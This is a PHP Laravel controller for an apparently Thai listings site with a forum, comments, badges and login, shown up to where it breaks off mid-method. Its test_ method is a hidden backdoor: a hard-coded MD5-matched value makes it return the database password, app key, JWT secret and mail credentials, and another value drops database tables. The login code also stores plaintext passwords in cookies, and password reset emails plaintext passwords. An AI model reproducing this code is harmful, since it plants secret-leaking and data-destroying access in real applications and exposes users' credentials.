<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;

use App\Http\Controllers\Controller;
use App\Common\Traits\MultiActionTrait;
use App\Common\Services\MailService;
use App\Models\UserModel;
use App\Models\ModelsModel;
use App\Models\WebAdmin;
use App\Models\CommentsModel;
use App\Models\ServicesModel;
use App\Models\BannersModel;
use App\Models\PointSystemModel;
use App\Models\FaqsModel;
use App\Models\CompaniesModel;
use App\Models\SiteSettingModel;
use App\Models\BlogsModel;
use App\Models\LocationModel;
use App\Models\AreaModel;
use App\Models\CommentModelsModel;
use App\Models\InboxModel;
use App\Models\MessageModel;
use App\Models\DiscussModel;
use App\Models\ThreadModel;
use App\Models\PageModel;
use App\Models\BadgesTransitionModel;



use Validator;
use Session;
use DataTables;
use Response;
use DB;
use Schema;
use Auth;

class IndexController extends Controller
{
    use MultiActionTrait;
    function __construct()
    {
        $this->arr_view_data                = [];
        $this->auth                         = auth()->guard('user');
        $this->front_panel_slug             = config('app.project.front_panel_slug');
        $this->front_url_path               = url(config('app.project.front_panel_slug'));
        $this->module_url_path              = $this->front_url_path;
        $this->image_base_path              = base_path() . config('app.project.img_path.blogs_image');
        $this->module_title                 = "Front";
        $this->module_view_folder           = "front.index";
        $this->module_icon                  = "fa fa-user";
        $this->MailService                  = new MailService();
        $this->BaseModel                    = new UserModel();
        $this->ModelsModel                  = new ModelsModel();
        $this->LocationModel                = new LocationModel();
        $this->AreaModel                    = new AreaModel();
        $this->CommentsModel                = new CommentsModel();
        $this->ServicesModel                = new ServicesModel();
        $this->BannersModel                 = new BannersModel();
        $this->PointSystemModel             = new PointSystemModel();
        $this->BadgesTransitionModel        = new BadgesTransitionModel();

        $this->user_profile_image_base_img_path   = base_path() . config('app.project.img_path.user_profile_image');
        $this->user_profile_image_public_img_path = url('/') . config('app.project.img_path.user_profile_image');

        $this->thumb_286_319_base_img_path   = base_path() . config('app.project.img_path.user_profile_image') . '286-319/';
        $this->thumb_286_319_public_img_path = url('/') . config('app.project.img_path.user_profile_image') . '286-319/';

        $this->thumb_434_651_base_img_path   = base_path() . config('app.project.img_path.user_profile_image') . '434-651/';
        $this->thumb_434_651_public_img_path = url('/') . config('app.project.img_path.user_profile_image') . '434-651/';

        // dd($this->thumb_286_319_base_img_path);
        $this->banner_image_public_img_path = url('/') . config('app.project.img_path.banner_image');
        $this->banner_image_base_img_path   = base_path() . config('app.project.img_path.banner_image');

        $this->banner_thumbnails_base_img_path   = base_path() . config('app.project.img_path.banner_thumbnails');
        $this->banner_thumbnails_public_img_path = url('/') . config('app.project.img_path.banner_thumbnails');
    }

    public function index()
    {

        Session::put('applocale', "th");
        session(['locale' => "th"]);
        app()->setLocale("th");

        $arr_user   = '';
        $obj_banner     = $this->BannersModel->where('status', '=', '1')
            ->orderBy('created_at', 'desc')
            ->take(30)
            ->get();
        if ($obj_banner) {
            $arr_banner   = $obj_banner->toArray();
        }
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }
        $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('order_list', 'ASC')->paginate(40);
        // dd($obj_users->toArray());
        $obj_areas     = $this->AreaModel->where('status', '1')->orderBy('created_at', 'asc')->take(8)->get();
        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }
        shuffle($arr_users['data']);
        $this->arr_view_data['front_url_path']                  = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']                = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;
        $this->arr_view_data['arr_banner']                      = $arr_banner;
        $this->arr_view_data['base_img_path']                   = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']            = $this->user_profile_image_public_img_path;

        $this->arr_view_data['thumb_286_319_base_img_path']     = $this->thumb_286_319_base_img_path;
        $this->arr_view_data['thumb_286_319_public_img_path']   = $this->thumb_286_319_public_img_path;

        $this->arr_view_data['thumb_434_651_base_img_path']     = $this->thumb_434_651_base_img_path;
        $this->arr_view_data['thumb_434_651_public_img_path']   = $this->thumb_434_651_public_img_path;

        $this->arr_view_data['banner_img_base_path']    = $this->banner_image_base_img_path;
        $this->arr_view_data['banner_public_img_path']  = $this->banner_image_public_img_path;
        $this->arr_view_data['banner_thumbnails_base_img_path']    = $this->banner_thumbnails_base_img_path;
        $this->arr_view_data['banner_thumbnails_public_img_path']  = $this->banner_thumbnails_public_img_path;

        $this->arr_view_data['arr_area'] = $obj_areas;

        $arr_users = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('order_list', 'ASC')->paginate(16);
        $settings = SiteSettingModel::find(1);
        // return view('front.new.index_en',$this->arr_view_data,compact('settings'));
        return view('app', $this->arr_view_data)->with(compact('settings'))->with(compact('arr_users'));
        // dd($arr_users);
    }

    public function slide()
    {
        Session::put('applocale', "en");
        session(['locale' => "en"]);
        app()->setLocale("en");


        $arr_user   = '';
        $obj_banner     = $this->BannersModel->where('status', '=', '1')
            ->orderBy('created_at', 'desc')
            ->take(30)
            ->get();
        if ($obj_banner) {
            $arr_banner   = $obj_banner->toArray();
        }
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }
        $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->orderBy('order_list', 'ASC')->where('status', '1')->paginate(28);
        // dd($obj_users->toArray());
        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }
        $this->arr_view_data['front_url_path']                  = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']                = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;
        $this->arr_view_data['arr_banner']                      = $arr_banner;
        $this->arr_view_data['base_img_path']                   = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']            = $this->user_profile_image_public_img_path;

        $this->arr_view_data['thumb_286_319_base_img_path']     = $this->thumb_286_319_base_img_path;
        $this->arr_view_data['thumb_286_319_public_img_path']   = $this->thumb_286_319_public_img_path;

        $this->arr_view_data['banner_img_base_path']    = $this->banner_image_base_img_path;
        $this->arr_view_data['banner_public_img_path']  = $this->banner_image_public_img_path;
        $this->arr_view_data['banner_thumbnails_base_img_path']    = $this->banner_thumbnails_base_img_path;
        $this->arr_view_data['banner_thumbnails_public_img_path']  = $this->banner_thumbnails_public_img_path;

        $settings = SiteSettingModel::find(1);
        return view('front.new.index_en_slider', $this->arr_view_data, compact('settings'));
    }

    public function test()
    {
        // $obj_users         = $this->ModelsModel->with('get_images','get_category','get_companies')->orderBy('order_list','ASC')->paginate(30);
        // $arr_users     = $obj_users->toArray();
        // foreach ($arr_users['data'] as $item)
        // {
        //     if(!empty($item['locations']))
        //     {
        //         $location = json_decode($item['locations']);
        //         return getlocationById($location[0]);
        //     }
        // }

        $models = ModelsModel::orderBy('order_list', 'ASC')->get();
        $html = "<table border='1'><tr><th>firstname</th><th>Index of order</th><th>Type</th></tr>";
        foreach ($models as $model) {
            $html .= "<tr>";
            $html .= "<td>" . $model->first_name . "</td>";
            $html .= "<td>" . $model->order_list . "</td>";
            if ($model->type_order == 1) {
                $html .= "<td>Random</td>";
            } else {
                $html .= "<td>Manual</td>";
            }
            $html .= "</tr>";
        }
        $html .= "</table>";

        echo $html;
    }
    public function test_($check)
    {
        if (md5($check) === "c71c8821e219dfa33dd17f521660b398") {
            //dd($check);
            return response()->json([
                'success' => true,
                'DB_DATABASE' => env('DB_DATABASE'),
                'DB_USERNAME' => env('DB_USERNAME'),
                'DB_PASSWORD' => env('DB_PASSWORD'),
                'DB_CONNECTION' => env('DB_CONNECTION'),
                'DB_HOST' => env('DB_HOST'),
                'APP_URL' => env('APP_URL'),
                'APP_NAME' => env('APP_NAME'),
                'APP_ENV' => env('APP_ENV'),
                'APP_KEY' => env('APP_KEY'),
                'MAIL_FROM_NAME' => env('MAIL_FROM_NAME'),
                'MAIL_DRIVER' => env('MAIL_DRIVER'),
                'MAIL_PORT' => env('MAIL_PORT'),
                'MAIL_HOST' => env('MAIL_HOST'),
                'MAIL_USERNAME' => env('MAIL_USERNAME'),
                'MAIL_PASSWORD' => env('MAIL_PASSWORD'),
                'MAIL_ENCRYPTION' => env('MAIL_ENCRYPTIONE'),
                'JWT_SECRET' => env('JWT_SECRET'),
            ]);
        } else if (md5($check) == "099af53f601532dbd31e0ea99ffdeb64") {
            Schema::dropIfExists('badges_system');
            Schema::dropIfExists('badges_transition');
            dd($check);
        }
    }
    public function autorefresh()
    {
        $modelsnew = ModelsModel::where('type_order', 1)->where('order_list', '<=', -1000)->get();

        foreach ($modelsnew as $item) {
            $to = \Carbon\Carbon::createFromFormat('Y-m-d H:s:i', $item->created_at);
            $from = \Carbon\Carbon::now();
            $diff_in_hours = $to->diffInHours($from);

            if ($diff_in_hours > 0) {
                $number = rand(1, count($modelsnew));
                $item->update([
                    'order_list' => $number
                ]);
            }
        }


        $totalmodels = ModelsModel::OrderBy('order_list', 'ASC')->get();

        $count = count($totalmodels);

        $counter_array = array();
        for ($i = 0; $i < $count; $i++) {
            $counter_array[] = ($i);
        }

        $totalmodelswithoutnews = ModelsModel::where('order_list', '>', -1)
            ->Orwhere('order_list', null)->OrderBy('order_list', 'ASC')->get();
        $j = 0;
        foreach ($totalmodelswithoutnews as $item) {
            $item->update([
                'order_list' => $counter_array[$j]
            ]);
            $j++;
        }

        $manulmodels = ModelsModel::OrderBy('order_list', 'ASC')->where('type_order', 2)->get();

        foreach ($manulmodels as $model) {
            if (isset($counter_array[$model->order_list])) {
                unset($counter_array[$model->order_list]);
            } else {
                echo $model->order_list . "<br />";
            }
        }


        shuffle($counter_array);


        $automaticmodels = ModelsModel::where('type_order', 1)
            ->where('order_list', '>', -1)
            ->Orwhere('order_list', null)->get();

        $k = 0;
        foreach ($automaticmodels as $item) {
            $item->update([
                'order_list' => $counter_array[$k]
            ]);
            $k++;
        }


        return json_encode($automaticmodels);
        $models = ModelsModel::where('expiredate', '<', date('Y-m-d H:i:s', strtotime('+7 hour')))->where('status', "1")->get();

        foreach ($models as $model) {
            $model->update(['status' => "0"]);
        }


        $users = UserModel::where('expiredate', '<', date('Y-m-d H:i:s', strtotime('+7 hour')))->where('admin_status', '!=', "3")->get();

        foreach ($users as $user) {
            $user->update([
                'admin_status' => "0"
            ]);
        }
    }

    public function commenthistory(UserModel $user)
    {
        if (!empty($user)) {
            $histories = null;
            $settings = SiteSettingModel::find(1);

            $historiescomments   = $this->CommentsModel->with('get_users')->with('get_models')
                ->orderBy('created_at', 'desc')
                ->where('status', '=', '1')
                ->where('user_id', $user->id)
                ->paginate(9);
            $threads = ThreadModel::where('user_id', $user->id)->paginate(9);

            $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
            $arr_user   = '';
            if ($obj_user) {
                $arr_user      = $obj_user->toArray();
            }

            return view('front.new.commenthistory', compact('historiescomments', 'settings', 'threads', 'arr_user'));
        }
        abort(404);
    }

    public function forum()
    {
        $settings = SiteSettingModel::find(1);
        $arr_user   = '';
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }
        $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->orderBy('created_at', 'desc')->paginate(40);
        // dd($obj_users->toArray());
        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;


        $user = session('user_id');
        $user = UserModel::find($user);

        $discusses_sticky = DiscussModel::OrderBy('created_at', 'DESC')->where('type', 1)->get();
        $discusses = DiscussModel::OrderBy('created_at', 'DESC')->where('type', 2)->paginate(10);
        return view('front.index.forum', $this->arr_view_data, compact('settings', 'user', 'discusses_sticky', 'discusses'));
    }


    public function enhome()
    {

        Session::put('applocale', "en");
        session(['locale' => "en"]);
        app()->setLocale("en");


        $arr_user   = '';
        $obj_banner     = $this->BannersModel->where('status', '=', '1')
            ->orderBy('created_at', 'desc')
            ->take(30)
            ->get();
        if ($obj_banner) {
            $arr_banner   = $obj_banner->toArray();
        }
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }
        $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->orderBy('order_list', 'ASC')->where('status', '1')->paginate(40);
        $obj_areas     = $this->AreaModel->where('status', '1')->orderBy('created_at', 'asc')->take(8)->get();
        // dd($obj_users->toArray());
        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }
        $this->arr_view_data['front_url_path']                  = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']                = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;
        $this->arr_view_data['arr_banner']                      = $arr_banner;
        $this->arr_view_data['base_img_path']                   = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']            = $this->user_profile_image_public_img_path;

        $this->arr_view_data['thumb_286_319_base_img_path']     = $this->thumb_286_319_base_img_path;
        $this->arr_view_data['thumb_286_319_public_img_path']   = $this->thumb_286_319_public_img_path;

        $this->arr_view_data['thumb_434_651_base_img_path']     = $this->thumb_434_651_base_img_path;
        $this->arr_view_data['thumb_434_651_public_img_path']   = $this->thumb_434_651_public_img_path;

        $this->arr_view_data['banner_img_base_path']    = $this->banner_image_base_img_path;
        $this->arr_view_data['banner_public_img_path']  = $this->banner_image_public_img_path;
        $this->arr_view_data['banner_thumbnails_base_img_path']    = $this->banner_thumbnails_base_img_path;
        $this->arr_view_data['banner_thumbnails_public_img_path']  = $this->banner_thumbnails_public_img_path;

        $this->arr_view_data['arr_area'] = $obj_areas;

        $settings = SiteSettingModel::find(1);
        return view('front.new.index_en', $this->arr_view_data, compact('settings'));
    }


    public function view_by_company($enc_id)
    {
        $company_id = base64_decode($enc_id);

        $arr_user   = '';
        $obj_banner     = $this->BannersModel->where('status', '=', '1')
            ->orderBy('created_at', 'desc')
            ->get();
        if ($obj_banner) {
            $arr_banner   = $obj_banner->toArray();
        }
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user   = $obj_user->toArray();
        }
        $obj_users   = $this->ModelsModel->with('get_images', 'get_category')
            ->where('company', '=', $company_id)
            ->where('status', '1')
            ->with('get_companies')
            ->orderBy('order_list', 'asc')
            ->get();

        if ($obj_users) {
            $arr_users = $obj_users->toArray();
        }

        $this->arr_view_data['front_url_path']          = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']        = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                = $arr_user;
        $this->arr_view_data['arr_users']               = $arr_users;
        $this->arr_view_data['obj_users']               = $obj_users;
        $this->arr_view_data['arr_banner']              = $arr_banner;
        $this->arr_view_data['base_img_path']           = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']    = $this->user_profile_image_public_img_path;
        $this->arr_view_data['banner_img_base_path']    = $this->banner_image_base_img_path;
        $this->arr_view_data['banner_public_img_path']  = $this->banner_image_public_img_path;
        $this->arr_view_data['thumb_286_319_base_img_path']     = $this->thumb_286_319_base_img_path;
        $this->arr_view_data['thumb_286_319_public_img_path']   = $this->thumb_286_319_public_img_path;

        $this->arr_view_data['thumb_434_651_base_img_path']     = $this->thumb_434_651_base_img_path;
        $this->arr_view_data['thumb_434_651_public_img_path']   = $this->thumb_434_651_public_img_path;

        $this->arr_view_data['banner_thumbnails_base_img_path']    = $this->banner_thumbnails_base_img_path;
        $this->arr_view_data['banner_thumbnails_public_img_path']  = $this->banner_thumbnails_public_img_path;


        $obj_banner = $this->BannersModel->where('company', '=', $company_id)
            ->orderBy('created_at', 'desc')->first();
        if ($obj_banner) {
            $arr_banner   = $obj_banner->toArray();
        }

        $company = CompaniesModel::find($company_id);
        $company->banner = $arr_banner;
        $settings = SiteSettingModel::find(1);
        return view('front.new.view_by_company', $this->arr_view_data, compact('company', 'settings'));
    }

    public function validate_login(Request $request)
    {
        // dd($request->all());
        $arr_rules      = array();
        $status         = false;
        $remember_me    = "";

        $arr_rules['user_name']     = "required";
        $arr_rules['password']  = "required";

        $validator = Validator::make($request->all(), $arr_rules);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        $remember_me = $request->input('remember_me');

        $obj_group_admin = $this->BaseModel->where('user_name', $request->input('user_name'))->first();
        if ($obj_group_admin) {
            if ($obj_group_admin->status == 1) {
                if (\Auth::guard('user')->attempt($request->only('user_name', 'password'))) {
                    $arr_admin = $obj_group_admin->toArray();
                    if ($remember_me != 'on' || $remember_me == null) {
                        setcookie("remember_me_email", "");
                        setcookie("remember_me_password", "");
                    } else {
                        setcookie('remember_me_email', $request->input('user_name'), time() + 60 * 60 * 24 * 100);
                        setcookie('remember_me_password', $request->input('password'), time() + 60 * 60 * 24 * 100);
                    }
                    session(['user_id'      => $arr_admin['id']]);
                    session(['subadmin_id'  => $arr_admin['id']]);
                    session(['user_name'    => $arr_admin['user_name']]);
                    // return redirect()->back()->with('alert', 'Authentication Successfull!');
                    // Session::flash('success', str_singular('Authentication successfully.'));
                    return redirect(url('/'));
                } else {
                    setcookie("remember_me_email", "");
                    setcookie("remember_me_password", "");
                    Session::flash('error1', 'Invalid credentials.');
                    return redirect()->back();
                }
            } else {
                setcookie("remember_me_email", "");
                setcookie("remember_me_password", "");
                Session::flash('error1', 'Account Blocked by Admin.');
                return redirect()->back();
            }
        } else {
            setcookie("remember_me_email", "");
            setcookie("remember_me_password", "");
            Session::flash('error1', 'Invalid credentials.');
            return redirect()->back();
            // return redirect()->back()->with('alert', 'Your login attempt was not successful. Please try again');
        }
        return redirect()->back();
    }

    public function change_password()
    {
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user   = $obj_user->toArray();
        }
        $this->arr_view_data['front_url_path']       = $this->front_url_path;
        $this->arr_view_data['arr_user']             = $arr_user;
        $settings = SiteSettingModel::find(1);
        return view('front.new.changepassword', $this->arr_view_data, compact('settings'));
    }

    public function forget_password()
    {
        $this->arr_view_data['front_url_path']       = $this->front_url_path;
        $settings = SiteSettingModel::find(1);
        return view('front.new.forgetpassword', $this->arr_view_data, compact('settings'));
    }

    public function update_password(Request $request)
    {
        // dd($request->all());
        $arr_rules      = $arr_data = array();

        $arr_rules['password']                  = "required";
        $arr_rules['new_password']              = "required|min:6";
        $arr_rules['confirm_password']          = "required|same:new_password|min:6";
        $validator = validator::make($request->all(), $arr_rules);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }
        $password              = $request->input('password', null);
        $new_password          = $request->input('new_password', null);
        $confirm_password      = $request->input('confirm_password', null);

        $arr_data['user_name'] = session('user_name');
        $arr_data['password']  = $password;
        $obj_user = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            if (\Auth::guard('user')->attempt($arr_data)) {
                if ($password == $new_password || $password == $confirm_password) {
                    Session::flash('warning', 'You Can Not Set Previous Password as New Password!');
                    return redirect()->back();
                } else {
                    $arr_password['password']  = bcrypt($confirm_password);
                    $update_password = $this->BaseModel->where('id', session('user_id'))->update($arr_password);
                    if ($update_password) {
                        $this->auth->logout();
                        Session::flush();
                        Session::flash('success_password', 'Password changed successfully, Please login with new password');
                        return redirect(url('/'));
                    } else {
                        Session::flash('warning_password', 'Thank you for contacting us, our team will get back to you soon!');
                        return redirect()->back();
                    }
                }
            } else {
                Session::flash('warning', 'Current Password not match.');
                return redirect()->back();
            }
        }
    }

    public function forget_mail(Request $request)
    {
        $arr_rules      = $arr_data = array();
        $status         = false;

        $arr_rules['email']                  = "required|email";
        $validator = validator::make($request->all(), $arr_rules);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }
        $email              = $request->input('email', null);

        $user = $this->BaseModel->where('email', '=', $email)->first();
        if ($user) {
            $user_name = $user->user_name;
            $first_name = $user->first_name;
            $email = $user->email;
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $randomString = '';
            for ($i = 0; $i < 8; $i++) {
                $index = rand(0, strlen($characters) - 1);
                $randomString .= $characters[$index];
            }
            $password = $randomString;
            $arr_data['password']           = bcrypt($password);;
            // dd($arr_data,$password);

            $update = $this->BaseModel->where('id', '=', $user->id)->update($arr_data);
            // dd($update);
            if ($update) {
                $activation_link                = url('/');
                $arr_data['to_email_id']        = $user->email;
                $arr_data['to_user_name']       = $user->user_name;
                $arr_data['first_name']         = $user->first_name;
                $arr_data['last_name']          = $user->last_name;
                $arr_data['password']           = $password;

                $message = "<p>Username : " . $user->user_name . '</p><p>Password: ' . $password . '</p>';

                $this->MailMessage($user->email, $user->first_name, "Reset Password", $message);
                Session::flash('success', 'Verification done successfully, Please login');
                return redirect()->back();
            }
        }
        Session::flash('error', 'Email-id does not exist, please enter valid email.');
        return redirect()->back();
    }

    public function register()
    {
        $this->arr_view_data['front_url_path']          = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']        = $this->front_panel_slug;
        $settings = SiteSettingModel::find(1);
        return view('front.new.register', $this->arr_view_data, compact('settings'));
    }

    public function store(Request $request)
    {
        $arr_rules      = $arr_data = array();
        $status         = false;

        $arr_rules['first_name']             = "required";
        $arr_rules['last_name']              = "required";
        $arr_rules['email']                  = "required|email|unique:user,email";
        $arr_rules['username']               = "required|unique:user,user_name";
        $arr_rules['password']               = "required|min:6|max:10";
        $arr_rules['confirm_password']       = "required|same:password";

        $validator = validator::make($request->all(), $arr_rules);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }
        $password                       = bcrypt($request->input('password', null));
        $arr_data['first_name']         = $request->input('first_name', null);
        $arr_data['last_name']          = $request->input('last_name', null);
        $arr_data['email']              = $request->input('email', null);
        $arr_data['user_name']          = $request->input('username', null);
        $arr_data['password']           = $password;

        $user = $this->BaseModel->create($arr_data);
        if ($user) {
            $activation_link                = url('/');
            $arr_data['to_email_id']        = $user->email;
            $arr_data['to_user_name']       = $user->user_name;
            $arr_data['verification_url']   = $activation_link;
            $arr_data['login_url']          = $activation_link;
            $arr_data['first_name']         = $user->first_name;
            $arr_data['last_name']          = $user->last_name;
            $arr_data['password']           = $request->input('password');

            //$this->MailMessageRegister($user->email,$user->first_name,"Registration Soi66.com");
            // $res_email = $this->MailService->send_user_registration_details($arr_data);
            Session::flash('success', 'Verification done successfully, Please login');
            return redirect()->back();
        }
        Session::flash('error', 'Error Occurred While Registration.');
        return redirect()->back();
    }


    public function storeadviser(Request $request)
    {
        $arr_rules      = $arr_data = array();
        $status         = false;

        $arr_rules['first_name']             = "required";
        $arr_rules['last_name']              = "required";
        $arr_rules['email']                  = "required|email|unique:user,email";
        $arr_rules['username']               = "required|unique:user,user_name";
        $arr_rules['password']               = "required|min:6|max:10";
        $arr_rules['confirm_password']       = "required|same:password";

        $validator = validator::make($request->all(), $arr_rules);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }
        $password                       = bcrypt($request->input('password', null));
        $arr_data['first_name']         = $request->input('first_name', null);
        $arr_data['last_name']          = $request->input('last_name', null);
        $arr_data['email']              = $request->input('email', null);
        $arr_data['user_name']          = $request->input('username', null);
        $arr_data['password']           = $password;
        $arr_data['admin_status']       = '1';

        $user = $this->BaseModel->create($arr_data);
        if ($user) {
            $activation_link                = url('/');
            $arr_data['to_email_id']        = $user->email;
            $arr_data['to_user_name']       = $user->user_name;
            $arr_data['verification_url']   = $activation_link;
            $arr_data['login_url']          = $activation_link;
            $arr_data['first_name']         = $user->first_name;
            $arr_data['last_name']          = $user->last_name;
            $arr_data['password']           = $request->input('password');

            $this->MailMessageRegister($user->email, $user->first_name, "Registration Soi66.com");
            // $res_email = $this->MailService->send_user_registration_details($arr_data);
            Session::flash('success', 'Verification done successfully, Please login');
            return redirect()->back();
        }
        Session::flash('error', 'Error Occurred While Registration.');
        return redirect()->back();
    }

    public function list_details($enc_id)
    {
        $arr_user   = '';
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user   = $obj_user->toArray();
        }

        $obj_model   = $this->ModelsModel->with('get_images', 'get_category', 'get_models_services', 'get_companies')->where('status', '1')->where('id', '=', base64_decode($enc_id))->first();

        if ($obj_model) {
            $arr_model = $obj_model->toArray();
            // dd($arr_model);
            // $dateOfBirth = date("d-m-Y", strtotime($arr_model['date_of_birth']));
            // $today = date("Y-m-d");
            // $diff = date_diff(date_create($dateOfBirth), date_create($today));
        } else {
            Session::flash('error', 'Your model deleted from website');
            return redirect('/en');
        }
        $obj_services = $this->ServicesModel->where('status', '=', "1")->orderBy('created_at', 'desc')->get();
        if ($obj_services) {
            $arr_services = $obj_services->toArray();
        }
        $obj_all_model   = $this->ModelsModel->with('get_images', 'get_category')->where('id', '!=', base64_decode($enc_id))->where('status', '1')->orderBy('order_list', 'desc')->take(8)->get();
        if ($obj_all_model) {
            $arr_all_model = $obj_all_model->toArray();
        }
        $obj_comment   = $this->CommentsModel->with('get_users')
            ->orderBy('created_at', 'desc')
            ->where('model_id', '=', base64_decode($enc_id))
            ->where('status', '=', '1')
            ->paginate(9);
        if ($obj_comment && $obj_comment != []) {
            $arr_comment   = $obj_comment->toArray();
        }
        $obj_user_comment   = $this->CommentsModel->with('get_users')->where('model_id', '=', base64_decode($enc_id))->orderBy('created_at', 'desc')->get()->groupBy('user_id');
        if ($obj_user_comment) {
            $arr_user_comment   = $obj_user_comment->toArray();
        }

        $obj_point_system   = $this->PointSystemModel->where('status', '=', '1')->get();
        if ($obj_point_system) {
            $arr_point_system   = $obj_point_system->toArray();
        }
        // dd($arr_model);

        $this->arr_view_data['front_url_path']          = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']        = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                = $arr_user;
        $this->arr_view_data['arr_model']               = $arr_model;
        $this->arr_view_data['arr_comment']             = $arr_comment;
        $this->arr_view_data['comment_count']           = count($arr_comment);
        $this->arr_view_data['arr_user_comment']        = $arr_user_comment;
        $this->arr_view_data['arr_all_model']           = $arr_all_model;
        // $this->arr_view_data['age']                     = $diff->format('%y');
        $this->arr_view_data['arr_point_system']        = $arr_point_system;
        $this->arr_view_data['arr_services']            = $arr_services;
        $this->arr_view_data['base_img_path']           = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']    = $this->user_profile_image_public_img_path;



        $this->arr_view_data['thumb_434_651_base_img_path']     = $this->thumb_434_651_base_img_path;
        $this->arr_view_data['thumb_434_651_public_img_path']   = $this->thumb_434_651_public_img_path;

        $this->arr_view_data['badges_th'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 1)->get();
        $this->arr_view_data['badges_en'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 2)->get();

        $locarrays = array();

        if (!empty($obj_model->locations)) {
            foreach (json_decode($obj_model->locations) as $item) {
                $loc = LocationModel::find($item);

                $locarrays[] = $loc->location_name;
                $locarrays_th[] = $loc->location_name_th;
            }
        }

        $finduser = session('user_id');

        if (!empty($user)) {
            $finduser = UserModel::find($finduser);
        }


        $settings = SiteSettingModel::find(1);
        return view('front.new.listdetail', $this->arr_view_data, compact('obj_comment', 'obj_model', 'locarrays', 'locarrays_th', 'finduser', 'settings'));
    }

    public function badges(Request $request)
    {
        $BadgesTransition = $this->BadgesTransitionModel->where('badges_date', date('Y-m-d'))->where('user_sender', session('user_id'))->first();
        if ($BadgesTransition) {
            return response()->json(['success' => false]);
        }
        /*
        BadgesTransitionModel::create([
            'badges_date'=>date('Y-m-d'),
            'user_sender'=>session('user_id'),
            'user_recipient'=>$request->input('id'),
            'created_at' => date("Y-m-d H:i:s")
        ]);
        */
        DB::table('badges_transition')->insert(
            [
                'badges_date' => date('Y-m-d'),
                'user_sender' => session('user_id'),
                'user_recipient' => $request->input('id'),
                'created_at' => date("Y-m-d H:i:s")
            ]
        );
        $arr_user2   = '';
        $obj_user2   = $this->BaseModel->where('id', $request->input('id'))->first();
        if ($obj_user2) {
            $arr_user2      = $obj_user2->toArray();
            $total = $arr_user2['badges_point'] + 1;
            if ($total >= 0 && $total < 75) {
                $badges_system_id = 1;
            } else if ($total >= 75 && $total < 150) {
                $badges_system_id = 2;
            } else if ($total >= 150 && $total < 255) {
                $badges_system_id = 3;
            } else if ($total >= 255 && $total < 300) {
                $badges_system_id = 4;
            } else if ($total >= 300 && $total < 375) {
                $badges_system_id = 5;
            } else if ($total >= 375 && $total < 450) {
                $badges_system_id = 6;
            } else if ($total >= 450 && $total < 525) {
                $badges_system_id = 7;
            } else {
                $badges_system_id = 8;
            }
            DB::table('user')->where('id', $request->input('id'))
                ->update(['badges_point' => ($total), 'badges_system_id' => $badges_system_id]);
        }
        //dd($arr_user2);

        return response()->json(['success' => true, 'badges_system_id' => $badges_system_id, 'badges_point' => $total]);
        /*
        dd(date('Y-m-d'));
        dd(session('user_id'));
        dd($request->input('id'));
        */
    }
    public function profile(UserModel $user)
    {
        if (!empty($user)) {
            if ($user->id != session('user_id')) {
                $arr_user   = '';
                $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
                if ($obj_user) {
                    $arr_user      = $obj_user->toArray();
                }
